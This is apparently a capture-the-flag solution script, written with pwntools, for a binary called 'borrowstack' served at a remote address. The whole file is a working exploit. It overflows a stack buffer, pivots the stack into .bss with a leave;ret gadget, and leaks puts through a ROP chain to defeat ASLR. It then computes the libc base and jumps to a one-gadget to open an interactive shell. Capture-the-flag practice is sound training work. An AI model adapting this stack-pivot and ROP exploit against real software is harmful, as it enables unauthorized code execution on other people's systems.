from pwn import * 
context.log_level = 'debug'
#p = process("./borrowstack")
p = remote("123.56.85.29", 3635)
elf = ELF("./borrowstack")
libc = ELF("../libc-2.23.so")
lev_ret = 0x400699
bss = 0x601080
read = 0x400680
pop_rdi = 0x400703
pop_rsi_r15=0x400701
#gdb.attach(p, 'b*0x400699')
payload = 'a'*0x60+p64(bss+0x40)+p64(lev_ret)#p64(0x400660)
p.sendafter("\n", payload)
rop1 = p64(bss)*0x9+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss)+p64(bss+0x60)+p64(elf.plt['read'])
p.sendafter("\n", rop1)

puts_addr = u64(p.recv(6)+'\x00'*2)
log.info("puts_addr==> " + hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
#sleep(0.1)
rop2 = 'a'*(0x118-0x88)+p64(libc.address+0x4526a)
#p64(pop_rdi)+'/bin/sh\x00'+p64(libc.sym['system'])
p.sendline(rop2)
p.interactive()

